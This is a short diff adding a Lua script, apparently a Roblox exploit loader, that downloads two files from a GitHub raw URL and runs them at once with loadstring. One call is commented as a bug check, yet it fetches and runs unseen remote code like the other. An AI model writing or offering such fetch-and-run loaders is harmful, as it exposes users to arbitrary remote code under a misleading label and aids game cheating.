@@ -1,0 +1,11 @@
+-- check script if it has bugs
+local function s1()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ValuesScripts/ValueScript/refs/heads/main/r"))()
+end
+-- load ui lib
+local function s2()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ValuesScripts/ValueScript/refs/heads/main/ValueScriptHolder"))()
+end
+task.spawn(s2)
+wait(3)
+task.spawn(s1)
